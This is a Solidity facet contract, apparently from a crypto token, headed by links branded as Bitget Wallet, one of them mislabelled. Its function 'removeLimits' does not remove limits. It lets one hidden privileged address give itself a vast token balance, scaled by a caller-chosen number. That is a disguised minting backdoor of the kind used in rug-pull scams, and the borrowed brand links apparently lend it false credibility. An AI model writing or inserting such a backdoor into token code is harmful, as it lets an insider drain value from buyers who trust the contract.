/*  
   * SPDX-License-Identifier: MIT 

    // Telegram: https://discord.com/invite/bitget-wallet
    // Twitter: https://twitter.com/BitgetWallet
    // Website: https://web3.bitget.com/en/
    // Discord: https://discord.com/invite/bitget-wallet
    // Medium:  https://bitgetwalletblog.medium.com/
   

*/
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
